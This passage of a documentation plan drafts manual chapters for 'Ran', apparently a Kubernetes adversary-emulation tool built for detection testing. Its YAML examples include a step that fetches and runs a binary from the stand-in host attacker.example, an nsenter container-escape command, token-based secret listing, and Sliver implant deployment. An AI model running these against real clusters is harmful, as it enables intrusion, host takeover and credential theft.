| `c2.session(backend, tgt)` | `SessionChannel` | An active C2 session from `backend` to `tgt` |

### The `sys` placeholder

In relation effects, `sys` is a special token that resolves to the entity the TTP
ran against (i.e. the current target). Use it instead of hardcoding an entity ID:

```yaml
effects:
  - container.escape(sys)    # the pod that performed the escape
  - c2.session(sliver, sys)  # sliver now has a session to the current target
```

### Envelopes

When a relation effect is applied for a technique that *also* establishes an
execution channel — `container.escape`, `rce.can-exec`, or `k8s.kubelet-exec` —
Ran stores the exact grounded command from the procedure as an **envelope** on that
relation. Subsequent commands routed through that relation are wrapped with the
envelope automatically, so the operator doesn't need to re-enter the exploit for
every follow-on technique.

## Effect evaluation order

1. The TTP's procedure runs.
2. Effect strings are collected from the `effects:` list.
3. Each effect is grounded (parameter placeholders substituted).
4. Ran applies the resulting entity and relation updates to the campaign graph.
5. Inference rules run to completion (up to 8 iterations), deriving any additional
   relations that follow logically from the new state.

The full catalog of effects is in the [Effect Catalog](../reference/effects.md).
```

- [ ] **Step 2: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 3: Commit**

```bash
git add docs/book/src/campaign/effects.md
git commit -m "docs(book): write campaign effects chapter"
```

---

## Task 9: Campaign — Preconditions and Running Emulation

**Files:**
- Write: `docs/book/src/campaign/preconditions.md`
- Write: `docs/book/src/campaign/running.md`

- [ ] **Step 1: Write `docs/book/src/campaign/preconditions.md`**

```markdown
# Preconditions

Preconditions define what must be true in the campaign before a TTP can run.
Ran evaluates them automatically when you select a target, so the armory shows
only applicable techniques — not every technique regardless of context.

## Declaring preconditions

```yaml
preconditions:
  kind: ServiceAccount
  rbac:
    - verb: create
      resource: roles
  accessLevel: user-exec
```

All precondition keys are optional. A TTP with no `preconditions:` block is always
considered applicable (no constraints).

## Precondition keys

### `kind`

The entity type the TTP targets. When `kind` is set, the TTP only appears in the
armory when the selected target entity is of that type.

Common values: `Pod`, `ServiceAccount`, `Node`, `Deployment`, `System`

`System` means the TTP runs on the operator's local machine rather than inside
the cluster.

```yaml
preconditions:
  kind: ServiceAccount
```

### `rbac`

A list of `{verb, resource}` pairs. At least one service account captured in the
campaign must hold *all* of the listed permissions for the TTP to be considered
applicable.

```yaml
preconditions:
  rbac:
    - verb: create
      resource: roles
    - verb: create
      resource: rolebindings
```

If no service accounts have been captured yet, RBAC-gated techniques are never
surfaced.

### `accessLevel`

Requires the target entity to have at least exec-level access. Set to any of the
values below — all of them resolve to the same check (the target must have
`AccessLevel::Exec`):

`user-exec`, `user-read`, `user-write`, `root-exec`, `root-read`

```yaml
preconditions:
  accessLevel: user-exec
```

Set `accessLevel: none` to explicitly pass regardless of the target's access level.

Three tactics are always exempt from access level checks regardless of what the
YAML declares: **Initial Access**, **Lateral Movement**, and **Resource Development**.

### `exists`

Requires a specific entity kind to be present in the campaign graph. Currently
supports:

- `Listener` — at least one C2 listener must be active

```yaml
preconditions:
  exists:
    - Listener
```

### `has-token`

Requires the target entity to have a captured JWT token.

```yaml
preconditions:
  has-token: true
```

### `related`

Requires a related entity of a given kind — and optionally with a minimum access
level — to exist in the campaign graph. Currently supports:

- Target `ServiceAccount` + related `Pod`: finds pods that mount the SA; if
  `accessLevel` is also set, at least one such pod must have exec access.

```yaml
preconditions:
  related:
    - kind: Pod
      accessLevel: user-exec
```

## How Ran evaluates preconditions

For each entity shown in the cluster map, Ran evaluates all preconditions against
the current campaign state. A TTP becomes applicable when *all* conditions are
satisfied simultaneously. In the UI, applicable techniques light up in the armory
panel; non-applicable ones are greyed out with a tooltip explaining which condition
failed.
```

- [ ] **Step 2: Write `docs/book/src/campaign/running.md`**

```markdown
# Running Multi-Step Emulation

Multi-step emulation is the main workflow in `ran emulate`. Rather than invoking
individual techniques in isolation, you follow the same discovery-and-exploitation
loop an adversary would.

## The emulation loop

1. **Start with a foothold.** Either use `--godmode` to seed the graph from your
   kubeconfig, or begin from a single compromised pod:

   ```sh
   ran emulate --target default/compromised-pod
   ```

2. **Select a target.** Click an entity in the cluster map. The armory panel
   updates to show only techniques applicable to that entity.

3. **Pick a technique.** Choose from the applicable TTPs. Read the description and
   note which procedures are available. Select the procedure that matches your
   current tooling (e.g. `kubectl` vs raw `curl` vs the built-in k8s-request).

4. **Adjust parameters if needed.** Most parameters have sensible defaults derived
   from the target entity. Override as required.

5. **Execute.** The output streams to the right panel. Watch the cluster map —
   newly discovered entities appear as nodes, and new relations appear as edges.

6. **Follow the graph.** The newly discovered entities are now available as targets.
   Select them and repeat from step 3.

7. **Clean up when done.** Use the Clean Up button for any technique that modified
   cluster state.

## Reading the cluster map

Entities in the map are coloured by type:

- **Blue** — Pods
- **Purple** — ServiceAccounts
- **Green** — Nodes
- **Yellow** — Roles and RoleBindings
- **Red** — C2 Servers and active sessions

Relation edges show the direction and type of the connection. Hover over an edge
to see its type. Edges with envelopes (escape paths, RCE chains) are drawn with a
dashed line.

## Following execution paths

Once a lateral movement path is established — e.g. a `container.escape` relation
from a pod to a node — you can select the node as a target and run techniques
directly on it. Ran routes the commands through the escape envelope automatically.

## Exporting the session

At any point you can export the current campaign as a MITRE Attack Flow document:

```sh
ran export --format attack-flow
```

This produces a STIX 2 JSON file representing the full graph of actions and
discovered assets. See [Reading the Attack Trail](trail.md).
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/campaign/preconditions.md docs/book/src/campaign/running.md
git commit -m "docs(book): write campaign preconditions and running emulation chapters"
```

---

## Task 10: Campaign — C2 Layer and Attack Trail

**Files:**
- Write: `docs/book/src/campaign/c2.md`
- Write: `docs/book/src/campaign/trail.md`

- [ ] **Step 1: Write `docs/book/src/campaign/c2.md`**

```markdown
# The C2 Layer

Ran supports a command-and-control (C2) layer for techniques that require a
persistent, bi-directional session with a compromised target — rather than
individual one-shot commands.

## What C2 enables

When you establish a C2 session from a technique, Ran records a `c2.session`
relation in the knowledge graph linking the C2 server to the target entity. Any
subsequent technique targeted at that entity can be routed through the session,
enabling:

- Persistent shell access across TTPs
- Techniques that require long-lived connections
- Multi-hop pivoting: run a technique against a third entity by routing through
  an established C2 session

## Sliver integration

Ran ships with built-in support for [Sliver](https://github.com/BishopFox/sliver),
an open-source C2 framework. The integration lives in the `Resource Development`
tactic:

| TTP | What it does |
|---|---|
| `create-listener` | Start a Sliver listener (mTLS, WireGuard, HTTP, DNS) |
| `generate-implant` | Generate a Sliver implant binary for the target architecture |
| `connect-to-sliver` | Connect the Ran operator to a running Sliver server |
| `deploy-sliver-implant` | Drop and execute the implant on a target pod |

Once the implant connects back, Ran detects the session and adds a `c2.session`
relation to the graph.

## The `c2.session` effect

Any TTP that establishes a C2 connection should declare the effect:

```yaml
effects:
  - c2.session(sliver, sys)
```

Arguments:
- First arg: the C2 backend identifier (`sliver`, or `c2/sliver` for explicit
  namespacing, or `session/<name>` for a specific named session)
- Second arg: the target entity ID, or `sys` for the current target

## Using an established session

Once a `c2.session` relation exists, selecting the target entity in the UI shows
an additional execution context: **via [session name]**. Choosing this routes
subsequent technique commands through the C2 session rather than `kubectl exec`.

This is how multi-hop lateral movement works: gain access to Pod A via kubectl
exec, deploy an implant, use that implant session to run techniques against Pod B
which is only reachable from Pod A's network segment.
```

- [ ] **Step 2: Write `docs/book/src/campaign/trail.md`**

```markdown
# Reading the Attack Trail

Every technique executed during a campaign is recorded in the **execution record**.
Together with the knowledge graph, it forms the complete audit trail of the
emulation session.

## What the execution record contains

For each invocation:

- The TTP ID, name, and tactic
- The target entity and its ID at execution time
- The procedure used and the grounded command
- The raw output (stdout + stderr)
- The entities and relations the execution produced
- A timestamp

## Viewing the trail in the UI

The **Timeline** panel (bottom of the `ran emulate` UI) shows the execution
record in chronological order. Click any entry to expand it and see the raw
output and the effects it produced.

The cluster map reflects the *cumulative* state — all entities and relations
discovered across the session. Use the timeline to step through how the graph
grew over time.

## Exporting as MITRE Attack Flow

Attack Flow is a MITRE CTID standard for representing sequences of adversary
actions as a STIX 2 graph. Ran can export the full campaign as an Attack Flow
document:

```sh
ran export --format attack-flow --output campaign.json
```

Or from within the web UI: **Export → Attack Flow (STIX 2)**.

The resulting file can be imported into the
[Attack Flow Builder](https://center-for-threat-informed-defense.github.io/attack-flow/ui/)
for visualisation, shared with blue team stakeholders, or used as input to replay
the same sequence in a future session.

## Using the trail for detection validation

The primary purpose of the attack trail is to validate your detection stack. After
a campaign session:

1. Open your SIEM or log platform.
2. For each TTP in the execution record, search for the expected detection signal.
3. Annotate the Attack Flow export: mark which steps triggered detections and which
   went undetected.
4. Repeat the campaign with variations on technique parameters or procedures to
   test edge cases in your detection rules.
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/campaign/c2.md docs/book/src/campaign/trail.md
git commit -m "docs(book): write C2 layer and attack trail chapters"
```

---

## Task 11: Extending — When to Write and Procedures

**Files:**
- Write: `docs/book/src/extending/when.md`
- Write: `docs/book/src/extending/procedures.md`

- [ ] **Step 1: Write `docs/book/src/extending/when.md`**

```markdown
# When to Write a Custom TTP

The built-in armory covers ~80 techniques across the MITRE ATT&CK tactic spectrum
for Kubernetes. Before writing a new one, check whether an existing technique can
be adapted:

- **Use `--param` overrides** — many techniques are parameterised enough that
  changing a command string or target address covers your use case.
- **Check the `disabled` techniques** — `ran armory --all` lists disabled TTPs.
  A technique may already exist but be disabled because its PoC binary isn't
  bundled. You can enable it via a custom YAML override.
- **Check custom armory support** — if you have a slightly different variant of
  an existing technique, override it by placing a YAML with the same `id` in your
  custom armory directory.

Write a new TTP when:

- You need a technique for a CVE or exploit chain that doesn't exist in the armory.
- You want to test a custom application-level vulnerability specific to your environment.
- You need a technique from a tactic not yet covered (e.g. a new cloud provider API attack).
- You want to model internal tooling that wouldn't be appropriate in the public armory.

## File location and naming

Place custom TTPs under the relevant tactic directory in your custom armory:

```
my-ttps/
└── Privilege Escalation/
    └── exploit_internal_webhook.yaml
```

The filename becomes the default TTP ID (kebab-cased). The tactic is inferred from
the directory name unless a `tactic:` field overrides it.

## Minimal valid TTP

The only required field is `name`. A TTP with just `name` and a `procedures` list
is immediately runnable:

```yaml
name: Check Node Hostname
procedures:
  - key: shell
    command: hostname
```

Add `tactic`, `techniques`, `preconditions`, `parameters`, and `effects` as you
refine it. See [TTP Anatomy](../armory/anatomy.md) for the full field reference.

## Testing your TTP

After writing the YAML:

```sh
# Confirm it parses and appears in the armory
ran armory --armory ./my-ttps

# Invoke it
ran invoke check-node-hostname --armory ./my-ttps --target default/test-pod
```

If the TTP doesn't appear in `ran armory`, check for YAML syntax errors and
ensure the `name:` field is present.
```

- [ ] **Step 2: Write `docs/book/src/extending/procedures.md`**

```markdown
# Writing Procedures

A TTP can declare one or more procedures — different ways to execute the same
technique. The operator (or agent) picks one at invocation time.

## Shell command

The simplest procedure: a shell command to run on the target.

```yaml
procedures:
  - key: kubectl
    command: kubectl get pods --token=${TOKEN} -n=${NS} --output=json
```

- `key` — display name for the procedure, shown in the UI and used as the procedure
  ID. Also sets the preferred tool: if `key` matches a known tool TTP (e.g. `curl`,
  `wget`), that tool's setup steps are prepended automatically.
- `command` — the shell command to execute. Parameter placeholders (`${VAR}`) are
  resolved at runtime.

### Local commands

Some procedures run on the **operator's machine** rather than inside the target pod.
Set `isLocal: true`:

```yaml
procedures:
  - key: python-poc
    isLocal: true
    command: python3 /opt/exploits/cve-2025-1974.py --target ${TARGET.IP}
```

## Structured K8s API request

Use `k8s_request:` to describe a Kubernetes API call. Ran materialises this into
a concrete `kubectl` or `curl` command at runtime, resolving the API server URL
and credentials automatically.

```yaml
procedures:
  - key: k8s-request
    k8s_request:
      api_server: ${API_SERVER}
      api: /api/v1
      resource: serviceaccounts
      namespace: ${NS}
      cluster_scoped: ${ALL_NS}
      query: limit=500
      token: ${TOKEN}
      use_ca: false
```

| Field | Description |
|---|---|
| `api_server` | Base URL of the Kubernetes API server |
| `api` | API group path (e.g. `/api/v1`, `/apis/apps/v1`) |
| `resource` | Resource type (e.g. `pods`, `secrets`) |
| `namespace` | Namespace to query; ignored if `cluster_scoped` is true |
| `cluster_scoped` | `true` to query all namespaces |
| `query` | Optional query string appended to the URL |
| `token` | Bearer token for authorisation |
| `use_ca` | Whether to validate the server CA certificate |

## Structured HTTP request

Use `http_request:` for arbitrary HTTP calls:

```yaml
procedures:
  - key: curl
    tool: curl
    http_request:
      method: POST
      url: http://${TARGET}:${PORT}/api/v1/diagnostics/run
      headers:
        Content-Type: application/json
      body: '{"command":"${CMD}"}'
```

| Field | Description |
|---|---|
| `method` | HTTP method (`GET`, `POST`, `PUT`, `DELETE`, …) |
| `url` | Full URL with parameter placeholders |
| `headers` | Map of header name → value |
| `body` | Request body string |

The `tool:` field on the procedure specifies which CLI tool should handle the
request (`curl`, `wget`). If omitted, Ran uses its built-in HTTP client.

## Step sequences

Use `steps:` for ordered multi-phase operations (download → compile → execute):

```yaml
procedures:
  - key: staged-exploit
    steps:
      - fetch:
          url: https://attacker.example/exploit
          dest: /tmp/exploit
      - chmod:
          path: /tmp/exploit
          mode: "0755"
      - run:
          command: /tmp/exploit --payload ${CMD}
```

Step types: `fetch`, `chmod`, `run`, `write`, `delete`. The runtime compiles the
steps into a shell snippet joined with `&&`.

## Multiple procedures in one TTP

List as many procedures as you want. The UI renders them as a selectable list.
Prefer offering at least two where practical — one using native Kubernetes tooling
(`kubectl`) and one that only requires network access (`curl`):

```yaml
procedures:
  - key: kubectl
    command: kubectl get secrets -n=${NS} --token=${TOKEN} -o json

  - key: curl
    http_request:
      method: GET
      url: ${API_SERVER}/api/v1/namespaces/${NS}/secrets
      headers:
        Authorization: "Bearer ${TOKEN}"
```
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/extending/when.md docs/book/src/extending/procedures.md
git commit -m "docs(book): write extending armory when and procedures chapters"
```

---

## Task 12: Extending — Preconditions and Effects in Depth

**Files:**
- Write: `docs/book/src/extending/preconditions.md`
- Write: `docs/book/src/extending/effects.md`

- [ ] **Step 1: Write `docs/book/src/extending/preconditions.md`**

```markdown
# Preconditions in Depth

The [Preconditions](../campaign/preconditions.md) chapter in Campaign Emulation
explains what preconditions *do*. This chapter shows how to write them accurately
in your custom TTPs.

## Complete preconditions reference

All precondition keys are optional. Combine them freely; all must be satisfied
simultaneously for the TTP to be applicable.

### `kind`

Restricts the TTP to a specific entity type. The value is the entity kind as a
PascalCase string.

```yaml
preconditions:
  kind: Pod                  # runs against pods
  # kind: ServiceAccount    # runs against service accounts
  # kind: Node              # runs against nodes
  # kind: System            # runs locally on the operator machine (no cluster target)
```

### `rbac`

Requires at least one captured service account to hold all listed permissions.
Use the singular `verb` and `resource` keys (Ran normalises these internally).

```yaml
preconditions:
  rbac:
    - verb: create
      resource: roles
    - verb: create
      resource: rolebindings
    - verb: get
      resource: secrets
```

Wildcard permissions (`verb: "*"` or `resource: "*"`) in a captured service account
satisfy any specific requirement.

### `accessLevel`

Requires the target entity to have interactive execution access. All declared
values (except `none`) resolve to the same check:

```yaml
preconditions:
  accessLevel: user-exec   # or user-read, user-write, root-exec, root-read
```

Set `accessLevel: none` to pass regardless of access. Omitting the key entirely
has the same effect.

Initial Access, Lateral Movement, and Resource Development techniques are exempt
from access level checks unconditionally.

### `exists`

Requires a particular entity kind to be present in the campaign graph.

```yaml
preconditions:
  exists:
    - Listener    # at least one active C2 listener
```

### `has-token`

Requires the target entity to carry a captured JWT:

```yaml
preconditions:
  has-token: true
```

### `related`

Requires a related entity to exist in the campaign:

```yaml
preconditions:
  related:
    - kind: Pod
      accessLevel: user-exec   # at least one pod mounting this SA must have exec
```

Currently the only supported combination is `ServiceAccount` target + `Pod` related.

## Common patterns

### "Requires kubectl exec into a pod"

```yaml
preconditions:
  kind: Pod
  accessLevel: user-exec
```

### "Requires a captured high-privilege token"

```yaml
preconditions:
  kind: ServiceAccount
  has-token: true
  rbac:
    - verb: "*"
      resource: "*"
```

### "Resource Development setup step (no cluster access needed)"

```yaml
preconditions:
  kind: System
```

Or simply omit preconditions entirely for Resource Development TTPs, since that
tactic is unconditionally exempt from access level checks.
```

- [ ] **Step 2: Write `docs/book/src/extending/effects.md`**

```markdown
# Effects in Depth

The [Effects](../campaign/effects.md) chapter explains the effects system. This
chapter is a practical guide to writing effects in your custom TTPs.

## When to add effects

Add an `effects:` list whenever the TTP produces something that future techniques
should know about:

- It discovers a new entity (a pod, a service account, a node name)
- It establishes a new execution path (exec access, container escape, C2 session)
- It modifies an entity in a way that changes what's possible next (creates a role,
  binds a service account)

Effects on read-only discovery techniques (listing pods, enumerating RBAC) are
handled by the output parser pipeline — you typically don't need to write explicit
entity effects for these, only the list-form effect that triggers the parser:

```yaml
effects:
  - k8s.serviceAccountList    # triggers the service account output parser
  - k8s.podList               # triggers the pod list output parser
```

## Writing simple entity effects

Simple effects extract values from the active parameter context (the parameter
map at execution time). Make sure the required parameters exist in your TTP:

```yaml
parameters:
  Namespace:
    type: Namespace
    default: ${NS}
  ServiceAccountName:
    type: string
    description: Name of the service account that was created

effects:
  - k8s.serviceaccount
```

At runtime, Ran reads `Namespace` and `ServiceAccountName` from the parameter
map and creates a `ServiceAccount` entity.

## Writing relation effects

Relation effects take explicit entity IDs as arguments. Use `sys` for the
current execution target:

```yaml
# After an exploit grants exec on another pod:
effects:
  - rce.can-exec(sys, ns/target-ns/pod/victim-pod)

# After escaping the container:
effects:
  - container.escape(sys)

# After deploying a C2 implant:
effects:
  - c2.session(sliver, sys)
```

### Chaining escape paths

When `container.escape(sys)` is applied, Ran:

1. Creates a `K8sNode` entity for the host node (or a placeholder if the node
   name is not yet known)
2. Creates a `RunsOn` relation from the pod to the node
3. Creates a `ContainerEscape` relation storing the escape command as an envelope

If the escape command contains `${CMD}` (the standard slot for the wrapped payload),
Ran stores it as the envelope and subsequent technique commands are wrapped with it
automatically.

Example — an nsenter-based escape:

```yaml
procedures:
  - key: nsenter
    command: nsenter -t 1 -m -u -i -n -p -- ${CMD}

effects:
  - container.escape(sys)
```

## Effect evaluation and the `sys` placeholder

`sys` resolves to `TARGET_ID` — the campaign entity ID of the target at execution
time. It is available in all relation-style effects. Do not use `sys` in the first
argument of `k8s.can-exec` unless the source of the exec-ability is the current
target itself.

## Combining effects

List multiple effects to update several parts of the graph in one step:

```yaml
effects:
  - k8s.serviceaccount          # SA created
  - k8s.rolebinding             # binding created
  - k8s.can-exec(sys, ns/default/pod/victim)   # exec path established
```

Effects are applied in order, but all run within the same graph update cycle before
inference rules fire.
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/extending/preconditions.md docs/book/src/extending/effects.md
git commit -m "docs(book): write extending preconditions and effects in depth chapters"
```

---

## Task 13: Reference — YAML Field Catalog

**Files:**
- Write: `docs/book/src/reference/yaml-fields.md`

- [ ] **Step 1: Write `docs/book/src/reference/yaml-fields.md`**

````markdown
# YAML Field Catalog

Complete reference for every field in a Ran TTP YAML file. All fields are optional
except `name`. Fields marked **repeatable** accept a list.

---

## Top-level fields

| Field | Type | Required | Description |
|---|---|---|---|
| `name` | string | **yes** | Human-readable display name. Used to derive `id` if omitted. |
| `id` | string | no | Stable kebab-case identifier. Auto-derived from `name` if absent. |
| `description` | string | no | One or two sentences describing the technique. |
| `tactic` | string | no | MITRE ATT&CK tactic. Defaults to the parent directory name. |
| `techniques` | list | no | MITRE technique names and/or IDs, e.g. `["T1613", "Container and Resource Discovery"]`. |
| `status` | string | no | `enabled` (default), `stable`, `draft`, or `disabled`. |
| `parameters` | map | no | Named input variables. See [Parameters](#parameters). |
| `preconditions` | map | no | Gate conditions. Also accepted as `requires:`. See [Preconditions](#preconditions). |
| `procedures` | list | no | Execution methods. See [Procedures](#procedures). |
| `cleanup` | map | no | A single procedure to undo the technique. Same structure as one procedure entry. |
| `effects` | list | no | Effect expressions applied after a successful run. See [Effects](#effects). |
| `references` | list | no | URLs to CVEs, ATT&CK pages, write-ups, etc. |
| `tool_slot` | string | no | Marks this TTP as a tool implementation for the named slot (e.g. `"http-request"`). Advanced use. |

---

## Parameters

Declared as a map under `parameters:`. Each key becomes the parameter name.

```yaml
parameters:
  MY_PARAM:
    type: string
    description: What this parameter means
    default: some-default
    required: false   # optional: true also accepted
```

| Field | Type | Default | Description |
|---|---|---|---|
| `type` | string | `string` | Parameter type. One of: `string`, `Namespace`, `ServiceAccount`, `bool`, `int`. |
| `description` | string | `""` | Shown in the UI tooltip and CLI help. |
| `default` | any | `""` | Default value. Can reference built-in variables like `${NS}`. |
| `required` / `optional` | bool | `true` / `false` | Whether the parameter must be provided. `optional: true` is equivalent to `required: false`. |

**Built-in variable defaults:**

| Variable | Value at runtime |
|---|---|
| `${NS}` | Namespace of the target entity |
| `${TOKEN}` | Best available service account JWT |
| `${API_SERVER}` | Kubernetes API server URL |
| `${TARGET.IP}` | IP address of the target entity |
| `${TARGET_ID}` | Ran entity ID of the target (e.g. `pod/default/nginx`) |

---

## Preconditions

Declared as a map under `preconditions:` (alias: `requires:`).

| Key | Type | Description |
|---|---|---|
| `kind` | string | Entity type the TTP targets. Common: `Pod`, `ServiceAccount`, `Node`, `System`. |
| `rbac` | list | `{verb, resource}` pairs. At least one captured SA must hold all permissions. |
| `accessLevel` | string | Requires exec access on the target. Any value except `none` enforces the check. |
| `exists` | list | Entity kinds that must be present in the campaign graph. Supports: `Listener`. |
| `has-token` | bool | `true` — target entity must have a captured JWT token. |
| `related` | list | `{kind, accessLevel?}` — related entity requirements. |

---

## Procedures

Each procedure entry supports the following fields:

| Field | Type | Description |
|---|---|---|
| `key` / `id` | string | Display name and identifier. Doubles as the `tool` name if not set separately. |
| `tool` | string | Tool TTP slot to use for execution (e.g. `curl`, `wget`). |
| `command` | string | Shell command to run. Supports parameter placeholders. |
| `isLocal` / `isLocalCommand` | bool | Run on the operator's machine instead of the target. |
| `http_request` | map | Structured HTTP request. See [HTTP Request](#http-request). |
| `k8s_request` | map | Structured Kubernetes API request. See [K8s Request](#k8s-request). |
| `steps` | list | Ordered step sequence. See [Steps](#steps). |

### HTTP Request

```yaml
http_request:
  method: POST
  url: http://${TARGET}:${PORT}/endpoint
  headers:
    Content-Type: application/json
  body: '{"key":"${VALUE}"}'
```

### K8s Request

```yaml
k8s_request:
  api_server: ${API_SERVER}
  api: /api/v1                # or /apis/apps/v1, etc.
  resource: pods
  namespace: ${NS}
  cluster_scoped: false       # true = all namespaces
  query: limit=500            # appended as URL query string
  token: ${TOKEN}
  use_ca: false               # validate server CA
```

### Steps

```yaml
steps:
  - fetch:
      url: https://example.com/binary
      dest: /tmp/binary
  - chmod:
      path: /tmp/binary
      mode: "0755"
  - run:
      command: /tmp/binary --flag ${PARAM}
```

Supported step types: `fetch`, `chmod`, `run`, `write`, `delete`.

---

## Effects

Effect strings declared in the `effects:` list. Full catalog: [Effect Catalog](effects.md).

```yaml
effects:
  - k8s.serviceAccountList          # trigger output parser
  - k8s.pod                         # extract pod entity from parameters
  - container.escape(sys)           # record a container escape path
  - c2.session(sliver, sys)         # record a C2 session
  - rce.can-exec(sys, target-id)    # record an RCE execution path
```
````

- [ ] **Step 2: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 3: Commit**

```bash
git add docs/book/src/reference/yaml-fields.md
git commit -m "docs(book): write YAML field catalog reference chapter"
```

---

## Task 14: Reference — Effect Catalog and Precondition Types

**Files:**
- Write: `docs/book/src/reference/effects.md`
- Write: `docs/book/src/reference/preconditions.md`

- [ ] **Step 1: Write `docs/book/src/reference/effects.md`**

```markdown
# Effect Catalog

Complete reference for all built-in effect expressions. Effects are declared in
a TTP's `effects:` list and are evaluated after a successful run.

---

## Simple effects (no arguments)

These effects extract entities from the active parameter context.

### `k8s.pod`

Creates a `Pod` entity.

**Required context keys:** `Namespace`, `PodName` (also accepts `PODNAME`, `POD_NAME`)

**Optional context keys:** `NodeName`, `ServiceAccount` / `ServiceAccountName`, `IsRunning`

```yaml
effects:
  - k8s.pod
```

---

### `k8s.serviceaccount`

Creates a `ServiceAccount` entity.

**Required context keys:** `Namespace`, `ServiceAccountName` (also accepts `SA_NAME`)

**Optional context keys:** `Token` — if present, attaches a JWT to the SA

```yaml
effects:
  - k8s.serviceaccount
```

---

### `k8s.role`

Creates a `K8sRole` entity.

**Required context keys:** `Namespace`, `RoleName` (also accepts `ROLE_NAME`)

**Optional context keys:** `Rules` — JSON array of `{verbs, resources, apiGroups}` objects

```yaml
effects:
  - k8s.role
```

---

### `k8s.rolebinding`

Creates a `K8sRoleBinding` entity.

**Required context keys:** `Namespace`, `BindingName` (also accepts `BINDING_NAME`)

**Optional context keys:** `RoleRef`, `Subjects` — JSON array of `{kind, name, namespace}` objects

```yaml
effects:
  - k8s.rolebinding
```

---

### `k8s.cronjob`

Creates a `CronJob` entity.

**Required context keys:** `Namespace`, `CronJobName` (also accepts `CRONJOB_NAME`)

**Optional context keys:** `Schedule` — cron expression string

```yaml
effects:
  - k8s.cronjob
```

---

### List-form effects (output parsers)

These trigger Ran's output parser pipeline, which reads the TTP's raw command
output and extracts structured entities from it. The command output must be a
Kubernetes JSON response.

| Effect | Parser triggered |
|---|---|
| `k8s.podList` | Extract `Pod` entities from `kubectl get pods -o json` |
| `k8s.serviceAccountList` | Extract `ServiceAccount` entities |
| `k8s.nodeList` | Extract `Node` entities |
| `k8s.secretList` | Extract `Secret` metadata |
| `k8s.roleList` | Extract `K8sRole` entities |
| `k8s.roleBindingList` | Extract `K8sRoleBinding` entities |

---

## Relation effects (with arguments)

These create directed edges in the knowledge graph.

### `k8s.can-exec(src, tgt)`

Records that `src` can execute commands inside `tgt` via `kubectl exec`.

```yaml
effects:
  - k8s.can-exec(pod/default/attacker, pod/default/victim)
```

---

### `k8s.can-reach(src, tgt)`

Records a proven network path from `src` to `tgt`.

```yaml
effects:
  - k8s.can-reach(sys, pod/production/database)
```

---

### `runs-on(pod, node)`

Records that a pod runs on a specific node. Also accepted as `k8s.runs-on`.

```yaml
effects:
  - runs-on(pod/default/my-pod, node/worker-1)
```

---

### `k8s.kubelet-exec(src, tgt)` / `k8s.kubelet-exec-source(src, tgt)`

Records that `src` can execute commands on nodes via the kubelet API.
`tgt` may be a specific node ID or the wildcard `all(k8s.node)`.

When the procedure command contains `${CMD}`, Ran stores it as an envelope so
subsequent commands are routed via this path automatically.

```yaml
procedures:
  - key: ran-ws
    command: ran-ws -- ${CMD}

effects:
  - k8s.kubelet-exec(sys, all(k8s.node))
```

---

### `container.escape(src)`

Records a proven container escape from `src` (a pod) to its host node.

- Creates a `K8sNode` entity (or a placeholder if the node name is not yet known)
- Creates a `RunsOn` relation
- Creates a `ContainerEscape` relation storing the escape command as an envelope

`src` accepts `sys` (current target) or an explicit pod entity ID.

```yaml
procedures:
  - key: nsenter
    command: nsenter -t 1 -m -u -i -n -p -- ${CMD}

effects:
  - container.escape(sys)
```

---

### `rce.can-exec(src, tgt)`

Records a remote code execution path from `src` to `tgt` via an exploit chain.
The grounded procedure command is stored as an envelope for command routing.

```yaml
effects:
  - rce.can-exec(sys, pod/target-ns/victim-pod)
```

---

### `c2.session(backend, tgt)`

Records an active C2 session from `backend` to `tgt`.

**`backend` formats:**
- `sliver` — shorthand; resolves to source `c2/sliver`, session `session/sliver`
- `c2/sliver` — explicit namespacing
- `session/sliver-1` — references a named session; source becomes `c2/sliver-1`

**`tgt`:** entity ID or `sys`

```yaml
effects:
  - c2.session(sliver, sys)
```
```

- [ ] **Step 2: Write `docs/book/src/reference/preconditions.md`**

```markdown
# Precondition Types

Complete reference for all supported precondition keys.

---

## `kind`

**Type:** string

The entity type the TTP targets. Must match the kind of the selected target entity.

**Common values:**

| Value | Matches |
|---|---|
| `Pod` | Pod entities |
| `ServiceAccount` | ServiceAccount entities |
| `Node` | Node entities |
| `Deployment` | Deployment entities |
| `System` | No cluster entity — runs on the operator's machine |

Omitting `kind` means the TTP is applicable to any entity type.

---

## `rbac`

**Type:** list of `{verb, resource}` objects

At least one service account captured in the campaign must hold *all* listed
permissions.

```yaml
rbac:
  - verb: create
    resource: roles
  - verb: delete
    resource: events
```

- If no service accounts have been captured yet, RBAC-gated TTPs are never surfaced.
- Wildcard SA entitlements (`verb: "*"` or `resource: "*"`) satisfy any specific requirement.
- An empty `rbac: []` list is treated as satisfied (no RBAC requirement).

---

## `accessLevel`

**Type:** string

Requires the target entity to have `AccessLevel::Exec` — the ability to run
arbitrary commands on the entity.

**Any of these values enforce the check:** `user-exec`, `user-read`, `user-write`,
`root-exec`, `root-read`

**Exempt from this check regardless of the declared value:**

- Tactic `Initial Access`
- Tactic `Lateral Movement`
- Tactic `Resource Development`

Set `accessLevel: none` to explicitly pass without access. Omitting the key
entirely has the same effect.

---

## `exists`

**Type:** list of strings

Requires a specific entity kind to be present in the campaign graph.

**Supported values:**

| Value | Requirement |
|---|---|
| `Listener` | At least one `C2Server` entity must have a non-empty `listeners` list |

```yaml
exists:
  - Listener
```

Unknown values fail safe (the TTP is not surfaced).

---

## `has-token`

**Type:** bool

When `true`, the target entity must carry a captured JWT token.

```yaml
has-token: true
```

`false` or omitting the key: always satisfied.

---

## `related`

**Type:** list of `{kind, accessLevel?}` objects

Requires a related entity to exist in the campaign graph.

**Currently supported combinations:**

| Target kind | Related `kind` | Behaviour |
|---|---|---|
| `ServiceAccount` | `Pod` | At least one pod in the campaign must mount this SA. If `accessLevel` is set, at least one such pod must have exec access or be reachable via kubectl exec. |

Unknown `(target, related)` combinations pass by default (fail open, so future
